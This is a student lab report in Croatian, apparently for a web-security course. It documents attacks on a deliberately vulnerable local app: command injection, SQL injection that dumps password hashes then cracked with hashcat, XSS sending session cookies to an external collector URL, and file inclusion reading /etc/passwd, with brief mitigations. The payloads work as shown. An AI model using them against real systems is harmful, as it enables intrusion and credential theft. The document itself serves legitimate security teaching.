@@ -1,0 +1,89 @@
+SRS - 3. laboratorijska vjezba
+Bruno Cavor
+
+============================================================================
+1. zadatak
+============================================================================
+
+Koristene naredbe: 
+" 1 | find / -name ".txt" 2>/dev/null ", " 1 | cat /tmp/ .txt "
+
+Postupak:
+1. korak - pokusavamo pronaci lokaciju ciljane datoteke sto radimo naredbom " 1 | find / -name ".txt" 2>/dev/null ". Naredba vraca " /tmp/ .txt " sto nam otkriva gdje je ciljana datoteka.
+2. korak - citamo datoteku pomocu naredbe " 1 | cat /tmp/ .txt ". Nareda vraca " This is a personalized file. Its content below is required to be returned as part of the task. \n 37eb94bf4c12c777732e9f8645ac468f " sto je sadrzaj datoteke  .txt.
+
+Ispis:
+This is a personalized file. Its content below is required to be returned as part of the task. \n 37eb94bf4c12c777732e9f8645ac468f 
+
+============================================================================
+2. zadatak
+============================================================================
+
+Koristene naredbe:
+" 1' UNION SELECT user, password FROM users# ", hashcat.exe -m 0 -a 3 hashes.txt "?h?h?h?h?h?h?h?h?h?h"
+
+Dohvaceni hash:
+83b9becf21f335f2fa3c2fe205352810
+
+Konacna lozinka:
+5ff5fe7b35
+
+Postupak:
+1. korak - s obzirom da znamo strukturu tablice user, pomocu naredbe " 1' UNION SELECT user, password FROM users# " ispisujemo sve korisnike i sve lozinke. Naredba vraca
+" 
+ID: 1' UNION SELECT user, password FROM users#
+First name: admin
+Surname: admin
+ID: 1' UNION SELECT user, password FROM users#
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+ID: 1' UNION SELECT user, password FROM users#
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+ID: 1' UNION SELECT user, password FROM users#
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+ID: 1' UNION SELECT user, password FROM users#
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+ID: 1' UNION SELECT user, password FROM users#
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+ID: 1' UNION SELECT user, password FROM users#
+First name: student_57489
+Surname: 83b9becf21f335f2fa3c2fe205352810
+" te vidimo da je sazetak ciljane lozinke 83b9becf21f335f2fa3c2fe205352810. 
+2. korak - Pomocu alata hashcat i poznatih parametara, pokrecemo naredbu " hashcat.exe -m 0 -a 3 hashes.txt "?h?h?h?h?h?h?h?h?h?h" " sto nam vraca lozinku 5ff5fe7b35.
+
+============================================================================
+3. zadatak
+============================================================================
+
+Vrijednost varijable PHPSESSID:
+f7g5e7mole0vjbenpon9963a90
+
+Koristene naredbe:
+" <script>alert(document.cookie)</script> ", " <script>document.location="http://mrepro.tel.fer.hr/srs?cookie="+document.cookie+"&jmbag= "</script> "
+
+Postupak:
+1. korak - dohvacamo PHPSESSID pomocu naredbe " <script>alert(document.cookie)</script> " kako bismo mogli kasnije izvesti napad. Naredba vraca " PHPSESSID=f7g5e7mole0vjbenpon9963a90; security=low " sto je kolacic kojeg cemo zloupotrijebiti.
+2. korak - provodimo napad pomocu naredbe " <script>document.location="http://mrepro.tel.fer.hr/srs?cookie="+document.cookie+"&jmbag= "</script> ", no isprva ne mozemo unijeti citavu naredbu jer polje za unos ima ogranicenje stoga uz pomoc inspect opcije povecavamo ogranicenje kako bismo mogli unijeti citavu naredbu. Nakon promjene ogranicenja, pokrecemo naredbu koja nam vraca " Submission successful ", odnosno napad je uspio.
+
+Zastita:
+Od ovakvih napada stitimo se koristenjem HttpOnly zastavicom na kolacicima koja onemogucava njihovo koristenje u JavaScript skriptama, implementacijom CSP zaglavlja te sanitizacijom unosa.
+
+============================================================================
+4. zadatak
+============================================================================
+
+Koristene naredbe:
+" http://192.168.56.101/vulnerabilities/fi/?page=/etc/passwd "
+
+Postupak:
+1. korak - U adresnu traku upisujemo " http://192.168.56.101/vulnerabilities/fi/?page=/etc/passwd ". 
+Naredba vraca " 
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+" 
+
+Zastita:
+Od ovakvih napada stitimo se Whitelist-om, ne koristenjem direktnog unosa korisnika, basename funkcijom, PHP postavkama (allow_url_include i allow_url_fopen) te ogranicenjem pristupa datotecnom sustavu.
